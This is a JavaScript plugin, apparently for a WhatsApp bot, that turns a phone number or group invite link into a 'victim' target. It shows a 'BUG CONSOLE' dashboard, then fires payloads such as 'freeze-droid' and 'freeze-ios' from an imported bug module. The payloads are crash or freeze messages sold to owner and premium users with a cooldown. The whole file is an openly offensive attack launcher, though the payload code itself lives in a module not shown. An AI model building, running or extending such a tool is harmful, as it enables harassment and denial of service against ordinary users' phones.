'use strict';
const settings = require('../settings');
const bug = require('../helper/bugcore');

const MARK = '℘';

/* bold italic sans-serif (𝙩𝙮𝙥𝙚𝙙) — self-contained */
const FU = 0x1D63C, FL = 0x1D656, FD = 0x1D7EC;
function typed(s) {
  return String(s).replace(/[A-Za-z0-9]/g, (c) => {
    const p = c.charCodeAt(0);
    if (p >= 65 && p <= 90) return String.fromCodePoint(FU + p - 65);
    if (p >= 97 && p <= 122) return String.fromCodePoint(FL + p - 97);
    return String.fromCodePoint(FD + p - 48);
  });
}

const cooldowns = new Map();

/* ── target resolution ────────────────────────────────────────────────────── */
async function resolveTarget(conn, raw) {
  const t = String(raw || '').trim();
  if (!t) return null;

  if (/chat\.whatsapp\.com\//.test(t)) {
    const code = t.split('/').pop().split('?')[0];
    const info = await conn.groupGetInviteInfo(code);
    return info.id;
  }
  if (t.includes('@')) return t;

  const n = t.replace(/\D/g, '');
  if (n.length < 8) return null;
  return `${n}@s.whatsapp.net`;
}

/* ── dashboard ────────────────────────────────────────────────────────────── */
const RULE = '──────────────────────';

function field(label, value) {
  return [`${MARK}  ${typed(label)}`, `      ${value}`];
}

function dash(payload, victim, rounds) {
  const body = [
    `${MARK} ${RULE} ${MARK}`,
    `       ${typed('TOAA')}`,
    `    ${typed('BUG CONSOLE')}`,
    `${MARK} ${RULE} ${MARK}`,
    '',
    '',
    ...field('victim', victim),
    '',
    ...field('payload', typed(payload))
  ];

  if (rounds) body.push('', ...field('rounds', rounds));

  body.push(
    '',
    ...field('status', typed('TOAA executing victim...')),
    '',
    '',
    `${MARK} ${RULE} ${MARK}`,
    `   ${typed('wait 5 minutes')}`,
    `   ${typed('before sending another')}`,
    `${MARK} ${RULE} ${MARK}`
  );

  return body.join('\n');
}

/* ── shared runner ────────────────────────────────────────────────────────── */
async function dispatch(conn, m, args, ctx, name) {
  const chat = m.key.remoteJid;
  const reply = (t) => conn.sendMessage(chat, { text: t }, { quoted: m });
  const spec = bug.TARGET_COMMANDS[name];

  if (!spec) return reply(`${MARK} ${typed('unknown payload')} ${MARK}`);
  if (!ctx.isOwner && !ctx.isUserPremium) return reply(`${MARK} ${typed('access denied')} ${MARK}`);
  if (!args[0]) {
    return reply([
      `${MARK} ${typed('usage')} ${MARK}`,
      '',
      `.${name} <number | group link>`,
      `${MARK} ${RULE} ${MARK}`
    ].join('\n'));
  }

  let jid;
  try { jid = await resolveTarget(conn, args[0]); }
  catch { return reply(`${MARK} ${typed('invite resolve failed')} ${MARK}`); }

  if (!jid) return reply(`${MARK} ${typed('bad number')} ${MARK}`);
  if (spec.groupOnly && !jid.endsWith('@g.us')) return reply(`${MARK} ${typed('group only')} ${MARK}`);

  const sender = ctx.senderNumber || chat;
  const now = Date.now();
  const cd = settings.BUG_COOLDOWN || 300000;
  const last = cooldowns.get(sender) || 0;

  if (now - last < cd) {
    const wait = Math.ceil((cd - (now - last)) / 1000);
    return reply(`${MARK} ${typed('cooldown')} ${wait}s ${MARK}`);
  }
  cooldowns.set(sender, now);

  const victim = jid.split('@')[0];
  const rounds = args[1] && /^\d+$/.test(args[1]) ? args[1] : null;
  await reply(dash(name, victim, rounds));

  try {
    await bug.sendBugImage(conn, jid);
    await spec.run(conn, jid, args.slice(1));
    await reply(`${MARK} ${typed('delivered')} ${MARK}`);
  } catch (e) {
    cooldowns.delete(sender);
    await reply(`${MARK} ${typed('failed')} ${MARK}\n${e.message}`);
  }
}

/* ── command table ────────────────────────────────────────────────────────── */
const commands = {};

for (const name of Object.keys(bug.TARGET_COMMANDS)) {
  commands[name] = {
    category: 'bug',
    handler: (conn, m, args, ctx) => dispatch(conn, m, args, ctx, name)
  };
}

commands.freeze = {
  category: 'bug',
  handler: (conn, m, args, ctx) => dispatch(conn, m, args, ctx, 'freeze-droid')
};
commands.fios = {
  category: 'bug',
  handler: (conn, m, args, ctx) => dispatch(conn, m, args, ctx, 'freeze-ios')
};

module.exports = {
  name: 'bugs',
  version: '2.2',
  author: 'swanky',
  commands
};